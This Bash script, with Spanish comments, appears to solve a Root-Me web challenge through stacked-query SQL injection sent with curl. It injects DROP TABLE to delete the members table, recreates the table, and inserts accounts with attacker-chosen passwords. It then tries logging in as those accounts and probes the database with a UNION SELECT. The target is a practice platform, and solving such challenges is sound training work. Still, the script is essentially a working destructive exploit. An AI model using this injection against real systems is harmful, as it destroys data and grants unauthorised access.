#!/bin/bash

# ================================================
# ELIMINAR Y RECREAR TABLA - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  ELIMINAR Y RECREAR TABLA${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# PUNTO DE INYECCIÓN (el que mejor funcionó)
# ============================================

POINT="action=membres&id=1'"

# ============================================
# PASO 1: ELIMINAR TABLA
# ============================================

echo -e "\n${YELLOW}[+] Paso 1: Eliminando tabla membres...${NC}"

DROP_SQL="DROP TABLE IF EXISTS \`membres\`"
echo -e "${BLUE}[*] Consulta: $DROP_SQL${NC}"

response=$(curl -s "$URL?$POINT; $DROP_SQL" 2>/dev/null)

if echo "$response" | grep -qiE "error|warning"; then
    echo -e "${RED}❌ Error al eliminar:${NC}"
    echo "$response" | grep -iE "error|warning" | head -3
else
    echo -e "${GREEN}✅ Tabla eliminada (sin errores)${NC}"
fi

# ============================================
# PASO 2: CREAR TABLA
# ============================================

echo -e "\n${YELLOW}[+] Paso 2: Creando tabla membres...${NC}"

CREATE_SQL="CREATE TABLE IF NOT EXISTS \`membres\` (
  \`id\` int(1) NOT NULL AUTO_INCREMENT,
  \`username\` VARCHAR(5) NOT NULL,
  \`pass\` VARCHAR(20) NOT NULL,
  \`email\` VARCHAR(50) NOT NULL,
  PRIMARY KEY (\`id\`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=2"

echo -e "${BLUE}[*] Consulta: $CREATE_SQL${NC}"

response=$(curl -s "$URL?$POINT; $CREATE_SQL" 2>/dev/null)

if echo "$response" | grep -qiE "error|warning"; then
    echo -e "${RED}❌ Error al crear:${NC}"
    echo "$response" | grep -iE "error|warning" | head -3
else
    echo -e "${GREEN}✅ Tabla creada (sin errores)${NC}"
fi

# ============================================
# PASO 3: INSERTAR USUARIOS
# ============================================

echo -e "\n${YELLOW}[+] Paso 3: Insertando usuarios...${NC}"

USERS=(
    "INSERT INTO \`membres\` (\`id\`, \`username\`, \`pass\`, \`email\`) VALUES (1, 'admin', 'password123', 'admin@test.com')"
    "INSERT INTO \`membres\` (\`id\`, \`username\`, \`pass\`, \`email\`) VALUES (2, 'john', 'john123', 'john@test.com')"
    "INSERT INTO \`membres\` (\`id\`, \`username\`, \`pass\`, \`email\`) VALUES (3, 'teddy', 'teddy123', 'teddy@test.com')"
    "INSERT INTO \`membres\` (\`id\`, \`username\`, \`pass\`, \`email\`) VALUES (4, 'hacker', 'hack123', 'hacker@test.com')"
)

for user in "${USERS[@]}"; do
    echo -e "\n${BLUE}[*] Consulta: $user${NC}"
    response=$(curl -s "$URL?$POINT; $user" 2>/dev/null)
    
    if echo "$response" | grep -qiE "error|warning|duplicate"; then
        echo -e "${RED}❌ Error:${NC}"
        echo "$response" | grep -iE "error|warning|duplicate" | head -2
    else
        echo -e "${GREEN}✅ Usuario insertado${NC}"
    fi
done

# ============================================
# PASO 4: VERIFICAR DATOS
# ============================================

echo -e "\n${YELLOW}[+] Paso 4: Verificando datos...${NC}"

# Verificar con SELECT
data=$(curl -s "$URL?action=membres" 2>/dev/null | grep -o "admin\|john\|teddy\|hacker" | sort -u)

if [ -n "$data" ]; then
    echo -e "${GREEN}✅ Datos encontrados:${NC}"
    echo "$data" | while read user; do
        echo -e "  ${GREEN}- $user${NC}"
    done
else
    echo -e "${RED}❌ No se encontraron datos${NC}"
fi

# ============================================
# PASO 5: PROBAR AUTENTICACIÓN
# ============================================

echo -e "\n${YELLOW}[+] Paso 5: Probando autenticación...${NC}"

# Probar con admin
echo -e "${BLUE}[*] Probando admin/password123...${NC}"
auth1=$(curl -s -X POST "$URL" -d "username=admin&password=password123" | grep -c "login failed")
if [ "$auth1" -eq 0 ]; then
    echo -e "${GREEN}✅ admin/password123 FUNCIONA${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
    echo -e "${GREEN}  Usuario: admin${NC}"
    echo -e "${GREEN}  Contraseña: password123${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo -e "${RED}❌ admin/password123 NO funciona${NC}"
fi

# Probar con hacker
echo -e "${BLUE}[*] Probando hacker/hack123...${NC}"
auth2=$(curl -s -X POST "$URL" -d "username=hacker&password=hack123" | grep -c "login failed")
if [ "$auth2" -eq 0 ]; then
    echo -e "${GREEN}✅ hacker/hack123 FUNCIONA${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
    echo -e "${GREEN}  Usuario: hacker${NC}"
    echo -e "${GREEN}  Contraseña: hack123${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo -e "${RED}❌ hacker/hack123 NO funciona${NC}"
fi

# ============================================
# SI NADA FUNCIONA
# ============================================

echo -e "\n${RED}========================================${NC}"
echo -e "${RED}  NO SE PUDO COMPLETAR EL DESAFÍO${NC}"
echo -e "${RED}========================================${NC}"

echo -e "\n${YELLOW}[!] Posibles explicaciones:${NC}"
echo -e "  1. DROP TABLE no funcionó realmente"
echo -e "  2. CREATE TABLE no funcionó realmente"
echo -e "  3. INSERT no funcionó realmente"
echo -e "  4. El login usa una tabla o base de datos diferente"

echo -e "\n${YELLOW}[!] Prueba a verificar si la tabla sigue existiendo:${NC}"
verify=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,2,3,4 FROM membres#" 2>/dev/null)
if echo "$verify" | grep -qiE "error|warning"; then
    echo -e "${RED}❌ La tabla NO existe${NC}"
else
    echo -e "${GREEN}✅ La tabla existe${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN${NC}"
echo -e "${BLUE}========================================${NC}"
